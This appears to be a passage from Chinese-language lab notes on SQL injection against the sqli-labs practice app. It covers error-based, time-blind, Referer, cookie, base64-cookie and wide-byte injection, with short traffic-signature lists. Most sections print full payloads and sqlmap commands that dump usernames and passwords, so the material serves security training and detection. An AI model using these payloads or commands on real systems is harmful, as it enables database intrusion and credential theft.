extractvalue 函数接收两个字符串参数，一个属 xml 标记片段和 xpath 表达式 xpath expr（xml是一种可扩展标记语言，使用标签来操作，html 就是一种常见的标记型语言，xml 主要用来存储数据，体现在作配置文件，或者充当小型数据库，在网络中传输数据，类似与 HTML 语言中的 div 标签；）（xpath expr 也称为定位器，也就是路径查询，因为咱们主要是为了学习sql 注入，所有函数的原理不用太纠结，只要大概了解一下就行了）其实简单点来说，第一个参数就是为了上传一个 xml 文档，第二个参数就是用 xpath路径法查找路径，而 extractvalue报错注入 就是通过再函数中写如不符合语法格式的 xpath 达到报错的目的，并且通过拼接sql 注入语句从而通过报错查询并显示我们想要查询的内容；

例如:

```
' and extractvalue('1',concat(0x7e,(select @@version),0x7e)) or '1'='1
```

#### less-5 报错注入extractvalue

##### 版本

```mysql
http://192.168.70.14:8088/Less-5/?id=1' and extractvalue(1,concat(0x7e,version(),0x7e))--+
```

![image-20240806144004238](../../../../repo/assets/19.SQL注入/image-20240806144004238.png)

##### 数据库名

```mysql
http://192.168.70.14:8088/Less-5/?id=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+
http://192.168.70.14:8088/Less-5/?id=0' union select extractvalue(1,concat(0x7e,database(),0x7e)),2,3 --+
```

![image-20240806144039605](../../../../repo/assets/19.SQL注入/image-20240806144039605.png)

#####  表名

```mysql
http://192.168.70.14:8088/Less-5/?id=1' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+

http://192.168.70.14:8088/Less-5/?id=0' union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)),2,3--+
```

![image-20240806144258529](../../../../repo/assets/19.SQL注入/image-20240806144258529.png)

##### 字段名

```mysql
http://192.168.70.14:8088/Less-5/?id=1' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e))--+
```

![image-20240806144343123](../../../../repo/assets/19.SQL注入/image-20240806144343123.png)

#####  字段值

 group_concat()函数可能放不下所有内容，可以采用截取或者limit函数读取  

可以看出，爆出的字段名称长度超出了`32`，所以需要使用`substring（）`函数每隔`32`位截取一次，最终拼凑出全部内容。

```mysql
http://192.168.70.14:8088/Less-5/?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),1,31),0x7e))--+
http://192.168.70.14:8088/Less-5/?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),32,31),0x7e))--+
http://192.168.70.14:8088/Less-5/?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),63,31),0x7e))--+
http://192.168.70.14:8088/Less-5/?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),94,31),0x7e))--+
http://192.168.70.14:8088/Less-5/?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),125,31),0x7e))--+
http://192.168.70.14:8088/Less-5/?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),156,31),0x7e))--+
http://192.168.70.14:8088/Less-5/?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),187,31),0x7e))--+
```

![image-20240806144427905](../../../../repo/assets/19.SQL注入/image-20240806144427905.png)

![image-20240806144517081](../../../../repo/assets/19.SQL注入/image-20240806144517081.png)



### **三、流量特征**

#### 流量关键字

- Undatexml
- extractvalue
- Concat
- And
- Or

#### 敏感信息函数 

version database()等

## **利用报错函数** **floor** **带回回显的流量分析**

### **一、原理**

通过使用 count()、floor()、rand()、group by 四个条件形成**主键重复的错误**

> count()：计算满足某一条件下的行数
>
> floor()：**向下取整**的函数
>
> rand()：生成 0~1 之间的浮点数
>
> group by：针对表中的字段来**分组**

### **二、基础知识**

#### （1）Group by

原表中有一个 name 字段，有四行数据，其中有两行是重复的

#### （2）floor 函数

向下取整

#### （3）rand 函数

如果不指定参数，可以生成 `0~1` 之间的**随机浮点数**

如果指定参数为 0，生成的就是**伪随机数**了

### **三、报错攻击流量**

`floor()`函数与 `group by`、`rand()`联用时，

如果临时表中没有该主键，则在**插入前**会**再计算一次**`rand()`，

然后再由 `group by` 将计算出来的主键直接插入到临时表格中，导致**主键重复报错**，

错误信息如:`Duplicate entry "...' for key'group_key'` 。

```mysql
http://192.168.70.14:8088/Less-5/?id=1' union select 1,2,3 from (select count(*),concat((select concat(version(),'^',database(),'^',user()) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+
```

#### less-5报错注入floor

##### 数据库名

```mysql
http://192.168.70.14:8088/Less-5/?id=1' union select 1, count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x --+
```

`security`

![image-20240806171123832](../../../../repo/assets/19.SQL注入/image-20240806171123832.png)

##### 表名

```mysql
http://192.168.70.14:8088/Less-5/?id=1' union select 1,count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x --+
```

`emails`

![image-20240806171242318](../../../../repo/assets/19.SQL注入/image-20240806171242318.png)

##### 字段名

```mysql
http://192.168.70.14:8088/Less-5/?id=1' union select 1,count(*),concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x --+
```

`id`

![image-20240806171740441](../../../../repo/assets/19.SQL注入/image-20240806171740441.png)

##### 字段值

```mysql
http://192.168.70.14:8088/Less-5/?id=1' union select 1,count(*),concat(0x7e,(select username from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x --+
```

`Dumb`

![image-20240806171845214](../../../../repo/assets/19.SQL注入/image-20240806171845214.png)

![image-20240807094157085](../../../../repo/assets/19.SQL注入/image-20240807094157085.png)

### **四、流量特征**

- count()：计算满足某一条件下的行数
- floor()：向下取整的函数
- rand()：生成 0~1 之间的浮点数
- group by：针对表中的字段来分组

## **http-Referer 注入及流量分析**

### **一、**referer **注入条件**

- 1、用了 http 头的 referer
- 2、没有过滤 referer
- 3、用 referer 进行了 sql 操作

#### 实验演示 Less-19

首先看 Less-19 的源代码

通过 burpsuite 查找注入点

网站提示有 `referer` 信息，可能有注入点

验证

### **二、用如下** **Payload** **进行注入**

#### Less-19 时间盲注

`referer`

##### 数据库长度

```bash
' or if(length(database())=8,sleep(5),null) or '1'='1
```

![image-20240807142439357](../../../../repo/assets/19.SQL注入/image-20240807142439357.png)

##### 数据库名

```bash
' or if(substr(database(),1,1)='s',sleep(5),0) or '1'='1
```

![image-20240807194818146](../../../../repo/assets/19.SQL注入/image-20240807194818146.png)

##### 几张表

```bash
' or if((select count(table_name) from information_schema.tables where table_schema=database())=4,sleep(5),0) or '1'='1
```

![image-20240807194924211](../../../../repo/assets/19.SQL注入/image-20240807194924211.png)

##### 第一张表名长度

```bash
' or if(length((select table_name from information_schema.tables where table_schema='security' limit 0,1))=6,sleep(5),0) or '1'='1
```

![image-20240807195021956](../../../../repo/assets/19.SQL注入/image-20240807195021956.png)

##### 表名

```bash
' or if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,sleep(5),0) or '1'='1
```

![image-20240807195106894](../../../../repo/assets/19.SQL注入/image-20240807195106894.png)

##### 字段数

```bash
' or if((select count(column_name) from information_schema.columns where table_name='users' and table_schema=database())=3,sleep(5),0) or '1'='1
```

![image-20240807195152834](../../../../repo/assets/19.SQL注入/image-20240807195152834.png)

##### 字段名

```bash
' or if(ascii(substr((select column_name from information_schema.columns where table_name='users' and table_schema=database() limit 0,1),1,1))=105,sleep(5),0) or '1'='1
```

![image-20240807195247352](../../../../repo/assets/19.SQL注入/image-20240807195247352.png)

##### 字段值行数

```bash
' or if((select count(username) from users)=13,sleep(5),0) or '1'='1
```

![image-20240807195326526](../../../../repo/assets/19.SQL注入/image-20240807195326526.png)

##### 字段值

```
' or if(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(5),0) or '1'='1
```

![image-20240807195638111](../../../../repo/assets/19.SQL注入/image-20240807195638111.png)

#### Less-19 报错注入

##### 版本

```bash
' and updatexml(1,concat(0x7e,version(),0x7e),1) or '1'='1
```

![image-20240807150035666](../../../../repo/assets/19.SQL注入/image-20240807150035666.png)

##### 数据库名

```mysql
' and updatexml(1,concat(0x7e,database(),0x7e),1) or '1'='1
```

![image-20240807150109950](../../../../repo/assets/19.SQL注入/image-20240807150109950.png)

#####  表名

```mysql
' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or '1'='1
```

![image-20240807150151943](../../../../repo/assets/19.SQL注入/image-20240807150151943.png)

##### 字段名

```mysql
' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) or '1'='1
```

![image-20240807150217697](../../../../repo/assets/19.SQL注入/image-20240807150217697.png)

#####  字段值

```mysql
' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1) or '1'='1
' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),32,31),0x7e),1) or '1'='1
' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),63,31),0x7e),1) or '1'='1
' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),94,31),0x7e),1) or '1'='1
' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),125,31),0x7e),1) or '1'='1
' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),156,31),0x7e),1) or '1'='1
' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),187,31),0x7e),1) or '1'='1
```

![image-20240807150245173](../../../../repo/assets/19.SQL注入/image-20240807150245173.png)

#### Sqlmap报错注入 less-19

`Referer`

##### --data

```bash
sqlmap -u "http://192.168.70.14:8088/Less-19/" --data "uname=admin&passwd=admin"  --batch --purge --technique E --level 4 -p Referer --dbs
sqlmap -u "http://192.168.70.14:8088/Less-19/" --data "uname=admin&passwd=admin"  --batch --purge --technique E --level 4 -p Referer -D security --tables
sqlmap -u "http://192.168.70.14:8088/Less-19/" --data "uname=admin&passwd=admin"  --batch --purge --technique E --level 4 -p Referer -D security -T users --column  
sqlmap -u "http://192.168.70.14:8088/Less-19/" --data "uname=admin&passwd=admin"  --batch --purge --technique E --level 4 -p Referer -D security -T users --dump
```

##### -r

burpsuite抓包保存 less-19

![image-20240807150908918](../../../../repo/assets/19.SQL注入/image-20240807150908918.png)

`Referer`后添加`*`标记

```bash
POST /Less-19/ HTTP/1.1
Host: 192.168.70.14:8088
Content-Length: 38
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://192.168.70.14:8088
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.14:8088/Less-19/*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: xp=MTcyMjU4MTk1NnxEWDhFQVFMX2dBQUJFQUVRQUFBcF80QUFBUVp6ZEhKcGJtY01Dd0FKVTJGbVpVVnVkSEo1Qm5OMGNtbHVad3dJQUFZell6Tm1aVGM9fPMcNECUoQNlFjbgBfP0lmLnN-MAnqp1V_86YwwuNSpq
Connection: close

uname=admin&passwd=admin&submit=Submit
```

![image-20240807151100866](../../../../repo/assets/19.SQL注入/image-20240807151100866.png)

```
sqlmap -r /root/tools/sqlmap/19.txt --batch --purge --technique E --level 4 -p Referer --dbs
```

![image-20240807151508475](../../../../repo/assets/19.SQL注入/image-20240807151508475.png)

```
sqlmap -r /root/tools/sqlmap/19.txt --batch --purge --technique E --level 4 -p Referer -D security --tables
```

![image-20240807151543291](../../../../repo/assets/19.SQL注入/image-20240807151543291.png)

```
sqlmap -r /root/tools/sqlmap/19.txt --batch --purge --technique E --level 4 -p Referer -D security -T users --column 
```

![image-20240807151621346](../../../../repo/assets/19.SQL注入/image-20240807151621346.png)

```
 sqlmap -r /root/tools/sqlmap/19.txt --batch --purge --technique E --level 4 -p Referer -D security -T users --dump
```

![image-20240807151852464](../../../../repo/assets/19.SQL注入/image-20240807151852464.png)

### **三、流量分析**

- 盲注流量
- 时间盲注流量
- 布尔盲注流量
- 报错函数流量
- Undatexml
- Extractvalue
- floor



## **Sqlmap 进行 http 头注入及流量分析**

### **一、利用 sqlmap 进行头注入的方式**

利用 sqlmap 的方式（适用于 Less-19 的 http 头注入）

指定注入位置进行注入,在保存的文件中，对于参数的修改为`*`。

```
Sqlmap -r /root/sqli_Less-19.txt --batch --level 4 --dbs
```

Sqlmap 探测结果



#### sqlmap报错注入less-19

`Referer`

```
sqlmap -u "http://192.168.70.14:8088/Less-19/" --data "uname=admin&passwd=admin"  --batch --purge --technique E --level 4 -p Referer --dbs
sqlmap -u "http://192.168.70.14:8088/Less-19/" --data "uname=admin&passwd=admin"  --batch --purge --technique E --level 4 -p Referer -D security --tables
sqlmap -u "http://192.168.70.14:8088/Less-19/" --data "uname=admin&passwd=admin"  --batch --purge --technique E --level 4 -p Referer -D security -T users --column  
sqlmap -u "http://192.168.70.14:8088/Less-19/" --data "uname=admin&passwd=admin"  --batch --purge --technique E --level 4 -p Referer -D security -T users --dump
```



### **二、**sql**注入头注入流量分析**

- 1、大量的 sql 注入请求
- 2、请求中具有 sql 注入的常用关键字



## **Cookie 注入及流量分析**

### **一、cookie** **知识介绍**

服务器可以利用 Cookies 包含信息的任意性来筛选并经常性维护这些信息，

以判断在 HTTP 传输中的状态。Cookies 典型的应用是判定注册用户是否已经登

录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简

化登录手续，这些都是 Cookies 的功能。另一个重要应用场合是“购物车"之类

处理。用户可能会在一段时间内在同一家网站的不同页面中选择不同的商品，这

些信息都会写 Cookies,以便在最后付款时提取信息。

可以通过浏览器的开发者工具来查看 cookie

Console 中输入 doccument.cookie

### **二、代码分析** **cookie** **注入原理**

1. 获得请求得 cookie
2. Cookie 数据没有做特殊处理
3. Sql 语句得执行使用 cookie

代码中使用 Cookie 传递参数，但是没有对 Cookie 中传递的参数进行过滤操

作。导致 SQL 注入漏洞的产生。

源代码分析这里就可以利用’`$cookee`’来注入了

### **三、Cookie** **注入演示**

#### Less-20 报错注入

`Cookie`

用 burpsuite 发送给 Less-20 页面，第一次发送给没有 `cookie`，后来在发送就`cookie` 了

Payload 注入

用如下的 payload 进行注入可以获得版本

##### 版本

```
uname=admin' and updatexml(1,concat(0x7e,version(),0x7e),1) --+
```

![image-20240807193347522](../../../../repo/assets/19.SQL注入/image-20240807193347522.png)

##### 爆破数据库名

```
uname=admin' and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```

![image-20240807193428525](../../../../repo/assets/19.SQL注入/image-20240807193428525.png)

##### 爆破数据表名

```
uname=admin' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)--+
```

![image-20240807193509318](../../../../repo/assets/19.SQL注入/image-20240807193509318.png)

##### 爆破字段名

```
uname=admin' and updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 0,1),0x7e),1)-- +
```

![image-20240807193558679](../../../../repo/assets/19.SQL注入/image-20240807193558679.png)

##### 爆破字段

```
uname=admin' and  updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)-- +
```

![image-20240807193628070](../../../../repo/assets/19.SQL注入/image-20240807193628070.png)

### **四、Sqlmap** **完成** **cookie** **注入**

Sqlmap 完成注入的方式也是采用 http 头文件的方式

生成准备测试用的 http 头文件，其中 cookie 的位置要加上`*`然后进入到 sqlmap 中用 -r 命令进行测试

命令

```
Sqlmap -r sqli_Less_20.txt
```

测试结果

```
sqlmap -r /root/sqli_Less_20.txt --batch –dbs
```

#### Sqlmap报错注入less-20

`Cookie`

##### --data

```bash
sqlmap -u "http://192.168.70.14:8088/Less-20/index.php" --batch --purge --technique E --level 4 -p Cookie --cookie='uname=admin' --dbs
sqlmap -u "http://192.168.70.14:8088/Less-20/index.php" --batch --purge --technique E --level 4 -p Cookie --cookie='uname=admin' -D security --tables
sqlmap -u "http://192.168.70.14:8088/Less-20/index.php" --batch --purge --technique E --level 4 -p Cookie --cookie='uname=admin' -D security -T users --column
sqlmap -u "http://192.168.70.14:8088/Less-20/index.php" --batch --purge --technique E --level 4 -p Cookie --cookie='uname=admin' -D security -T users --dump
```

##### -r

![image-20240807160918463](../../../../repo/assets/19.SQL注入/image-20240807160918463.png)

```bash
GET /Less-20/index.php HTTP/1.1
Host: 192.168.70.14:8088
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.70.14:8088/Less-20/
Connection: close
Cookie: uname=admin*
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

![image-20240807160953278](../../../../repo/assets/19.SQL注入/image-20240807160953278.png)

```bash
sqlmap -r /root/tools/sqlmap/20.txt --batch --purge --technique E --level 4 -p Cookie --cookie='uname=admin' --dbs
```

![image-20240807161404195](../../../../repo/assets/19.SQL注入/image-20240807161404195.png)

```bash
sqlmap -r /root/tools/sqlmap/20.txt --batch --purge --technique E --level 4 -p Cookie --cookie='uname=admin' -D security --tables
```

![image-20240807161446539](../../../../repo/assets/19.SQL注入/image-20240807161446539.png)

```bash
sqlmap -r /root/tools/sqlmap/20.txt --batch --purge --technique E --level 4 -p Cookie --cookie='uname=admin' -D security -T users --column
```

![image-20240807161552492](../../../../repo/assets/19.SQL注入/image-20240807161552492.png)

```bash
sqlmap -r /root/tools/sqlmap/20.txt --batch --purge --technique E --level 4 -p Cookie --cookie='uname=admin' -D security -T users --dump
```

![image-20240807161612712](../../../../repo/assets/19.SQL注入/image-20240807161612712.png)

### **五、cookie** **注入流量分析**

#### 1、cookie 位置具有大量的 sql 注入字符串

#### 2、流量标志

- Updatexmle 
- extractvalue floor
- 盲注流量标志
- And if 
- sleep 获得数据库元数据函数

#### 3、如使用 sqlmap 进行探测，则有大量的请求



## **cookie base64 编码注入及流量分析**

### **一、Basement64** **编码介绍**

Base64 编码是从二进制到字符的过程，可用于在 HTTP 环境下传递较长的标识信息。

Base64 是网络上最常见的用于传输 8Bit 字节码的编码方式之一，

Base64就是一种基于 64 个可打印字符来表示二进制数据的方法。

将原始内容转换为二进制，从左到右依次取 6 位，然后在最高位补两位 0，形成新的内容。

#### Base64 编码的思想是：

采用 64 个基本的 ASCII 码字符对数据进行重新编码。

-  将需要编码的数据拆分成字节数组，以 3 个字节为一组，按顺序排列 24 位数据，再把这 24 位数据分成 4 组，即每组 6 位；
-  再在每组的的最高位前补两个 0 凑足一个字节，这样就把一个 3 字节为一组的数据重新编码成了 4 个字节；
-  当所要编码的数据的字节数不是 3 的整倍数，也就是说在分组时最后一组不够 3 个字节，这时在最后一组填充 1 到 2 个 0 字节，并在最后编码完成后在结尾添加 1 到 2 个`=`号

#### Base64 编码过程

具体编码过程如下，对 ABC 进行 Base64 编码过程

- 首先取 ABC 对应的 ASCII 码值

A : 65、B : 66、C : 67

- 再取二进制值

A : 01000001、B : 01000010、C : 01000011

- 然后把这三个字节的二进制码接起来

010000010100001001000011

- 再以 6 位为单位分成 4 个数据块并在最高位填充两个 0 后形成 4 个字节的编码后的值

00010000、00010100、00001001、00000011

- 再把这 4 个字节数据转化成 10 进制数

16、20、19、3

- 最后根据 Base64 给出的 64 个基本字符表，查出对应的 ASCII 码字符

Q、U、J、D

这里的值实际就是数据在字符表中的索引。

解码过程就是把 4 个字节再还原成 3 个字节再根据不同的数据形式把字节数

组重新整理成数据。

来看看 Basement4 编码

Less_22 抓取 Less_22 带有 cookie 的包，得到结果如下

用 decoder 解码工具，给 admin 在用 base64 编码，则得到结果和上面一样

### **二、**CookieB64注入代码分析

`base64_decode(str)`: PHP 语言中用于解密 Base64 解密字符串的函数。

Sqli Less-22



### **三、Cookie Base64** **注入演示**

判断存在 cookie base64 注入漏洞

用 admin\生成 Base64 为编码，带入到请求发送编码，然后找到注入漏洞

使用 Base64 加密的注入语句，插入到 Cookie 对应的位置完成 SQL 注入漏洞的探

测。`liBvciAxPTEglw==` 

明文`" or 1=1#`

利用 payload 如下：

```
" and updatexml(1,concat(0x7e,version(),0x7e),1) #
```

#### Less-22 报错注入bash64

**`bash64`编码**

`Cookie`

##### 数据库名

```bash
uname=admin" union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)-- +
uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKS0tICs=
```

![image-20240807172057262](../../../../repo/assets/19.SQL注入/image-20240807172057262.png)

##### 表名

```bash
uname=admin" union select 1,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)-- +
uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYSA9IGRhdGFiYXNlKCkpLDB4N2UpLDEpLS0gKw==
```

![image-20240807172131744](../../../../repo/assets/19.SQL注入/image-20240807172131744.png)

##### 字段名

```bash
uname=admin" union select 1,2,updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 0,1),0x7e),1)-- +
uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCAoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIGxpbWl0IDAsMSksMHg3ZSksMSktLSAr
```

![image-20240807172340273](../../../../repo/assets/19.SQL注入/image-20240807172340273.png)

##### 字段值

```bash
uname=admin" union select 1,2,updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)-- +
uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VybmFtZSBmcm9tIHVzZXJzIGxpbWl0IDAsMSksMHg3ZSksMSktLSAr
```

![image-20240807172427248](../../../../repo/assets/19.SQL注入/image-20240807172427248.png)



### **四、sqlmap** **完成** **cookie base64** **注入**

生成这个文件 sqli_Less_22.txt

在 txt 文件中将 http 头部的 cookie 位置加入`*`

然后用 sqlmap 去测试

测试结果

#### Less-22



> --tamper

```
ls /usr/share/sqlmap/tamper
```

```
0eunion.py                   concat2concatws.py            __init__.py                  randomcase.py         space2randomblank.py
apostrophemask.py            decentities.py                least.py                     randomcomments.py     sp_password.py
apostrophenullencode.py      dunion.py                     lowercase.py                 schemasplit.py        substring2leftright.py
appendnullbyte.py            equaltolike.py                luanginx.py                  scientific.py         symboliclogical.py
base64encode.py              equaltorlike.py               misunion.py                  sleep2getlock.py      unionalltounion.py
between.py                   escapequotes.py               modsecurityversioned.py      space2comment.py      unmagicquotes.py
binary.py                    greatest.py                   modsecurityzeroversioned.py  space2dash.py         uppercase.py
bluecoat.py                  halfversionedmorekeywords.py  multiplespaces.py            space2hash.py         varnish.py
chardoubleencode.py          hex2char.py                   ord2ascii.py                 space2morecomment.py  versionedkeywords.py
charencode.py                hexentities.py                overlongutf8more.py          space2morehash.py     versionedmorekeywords.py
charunicodeencode.py         htmlencode.py                 overlongutf8.py              space2mssqlblank.py   xforwardedfor.py
charunicodeescape.py         if2case.py                    percentage.py                space2mssqlhash.py
commalesslimit.py            ifnull2casewhenisnull.py      plus2concat.py               space2mysqlblank.py
commalessmid.py              ifnull2ifisnull.py            plus2fnconcat.py             space2mysqldash.py
commentbeforeparentheses.py  informationschemacomment.py   __pycache__                  space2plus.py
```

`uname=YWRtaW4%3D;` 

> --tamper base64encode

```
sqlmap -u "http://192.168.70.14:8088/Less-22/index.php" --batch --purge --technique E --level 4 -p Cookie --cookie='uname=YWRtaW4%3D;' --tamper base64encode.py --dbs
sqlmap -u "http://192.168.70.14:8088/Less-22/index.php" --batch --purge --technique E --level 4 -p Cookie --cookie='uname=YWRtaW4%3D;' --tamper base64encode.py -D security --tables
sqlmap -u "http://192.168.70.14:8088/Less-22/index.php" --batch --purge --technique E --level 4 -p Cookie --cookie='uname=YWRtaW4%3D;' --tamper base64encode.py -D security -T users --column
sqlmap -u "http://192.168.70.14:8088/Less-22/index.php" --batch --purge --technique E --level 4 -p Cookie --cookie='uname=YWRtaW4%3D;' --tamper base64encode.py -D security -T users --dump
```



### **五、流量分析**

编码 cookie 注入流量，须解码后查看研判

Sqlmap 流量一样，仍是大量请求，每一个请求解码收查看研判



## **宽字节注入**

### **一、宽字节注入基础**

#### **（1）、宽字节概念**

1. 1、单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)
2. 2、多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。
3. 3、宽字节注入是利用 mysql 的一个特性，使用 GBK 编码的时候，会认为两个字符是一个汉字

PHP 中编码为 GBK，函数执行添加的是 ASCII 编码，MYSQL 默认字符集是 GBK 等

#### （**2）、php 中的宽字节**

##### addslashes()函数

1、addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。

2、预定义字符：单引号（`'`），双引号（`"`），反斜杠（`\`），`NULL`

#### 3、实例

```
<?php
$ss=addslashes('aiyou"bu"cuoo');
echo($ss);
?>
```

运行结果：`aiyou\"bu\"cuoo`

%DF':会被 PHP 当中的 addslashes 函数转义为“ %DF\'”，\在 URL 里是“%5C"，

那么也就是说，“%DF'"会被转成“%DF%5C%27，之后再数据库查询语句进行 GBK多字节编码，即一个中文占用两个字节，一个英文同样占用两个字节且在汉字编码范围内两个编码为一个汉字。然后 MySQL 服务器会对查询语句进行 GBK 编码

即%df%5c 转换成汉字"運",单引号逃逸出来，从而绕过转义造成注入漏洞。

现在基本都会将 mysql 的连接配置设置为：

`[set character_set_client=binary]`

##### 涉及到的其他函数

`mysql_real_escape_string()`函数转义 SQL 语句中使用的字符串中的特殊字符

`mysql_escape_string()`转义一个字符串数据库使用的是 GBK 编码,PHP 编码为 `UTF8` 就可能出现宽字节注入，原因是为了防止发生 SQL 注入,会调用上面所介绍的几种函数,将单引号或双引号进行转义操作,在单或双引号前加上斜杠(`\`）。

当数据库使用的是**宽字节编码**会**将两个连在一起的字符会被当做是一个汉字**,而在 PHP 使用的 UTF8 编码则认为是两个独立的字符。 

### **二、宽字节注入代码分析**

两个条件都要有

Less-33 源代码分析

### **三、宽字节手动注入演示**

#### Less-33

##### 检查注入点

`1'`,单引号被`\`转义了。

```
http://192.168.70.14:8088/Less-33/?id=1%df' and 1=1--+
```

![image-20240808113321263](../../../../repo/assets/19.SQL注入/image-20240808113321263.png)

##### 判断字段数 

```
http://192.168.70.14:8088/Less-33/?id=1%df' and 1=1 order by 4--+ 
http://192.168.70.14:8088/Less-33/?id=1%df' and 1=1 order by 3--+ 
```

![image-20240808113347217](../../../../repo/assets/19.SQL注入/image-20240808113347217.png)

正常回显，有3列

##### 回显位

```
http://192.168.70.14:8088/Less-33/?id=0%df' and 1=2 union select 1,2,3--+  
```

![image-20240808113429517](../../../../repo/assets/19.SQL注入/image-20240808113429517.png)

显示2，3是回显点

##### 数据库名

```
http://192.168.70.14:8088/Less-33/?id=0%df' and 1=2 union select 1,2,database()--+
```

![image-20240808113548719](../../../../repo/assets/19.SQL注入/image-20240808113548719.png)

##### 表名

```
http://192.168.70.14:8088/Less-33/?id=0%df' and 1=2 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+
```

![image-20240808113614977](../../../../repo/assets/19.SQL注入/image-20240808113614977.png)

##### 字段名

`'user'`用不了，`'`单引号会被`\`转义,

`users`的16进制是`0x7573657273`

```
http://192.168.70.14:8088/Less-33/?id=0%df' and 1=2 union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+
```

![image-20240808113635509](../../../../repo/assets/19.SQL注入/image-20240808113635509.png)

##### 字段值

```
http://192.168.70.14:8088/Less-33/?id=0%df' and 1=2 union select 1,2,(select group_concat(username,0x7e,password) from users)--+
```

![image-20240808113657509](../../../../repo/assets/19.SQL注入/image-20240808113657509.png)

### **四、sqlmap** **进行宽字节注入**

用 sqlmap 进行宽自节注入，这些需要一个脚本

脚本名：`unmagicquotes.py`

脚本位置：

作用：宽字符绕过

#### sqlmap 宽字节注入less 33

> --tamper unmagicquotes

##### 数据库名

```
sqlmap -u http://192.168.70.14:8088/Less-33/?id=1 --tamper unmagicquotes --batch --dbs
```

##### 表名

```
sqlmap -u http://192.168.70.14:8088/Less-33/?id=1 --tamper unmagicquotes --batch -D security --tables 
```

##### 字段名

```
sqlmap -u http://192.168.70.14:8088/Less-33/?id=1 --tamper unmagicquotes --batch -D security -T users --column
```

##### 字段值

```
sqlmap -u http://192.168.70.14:8088/Less-33/?id=1 --tamper unmagicquotes --batch -D security -T users --dump
```

### **五、流量分析**

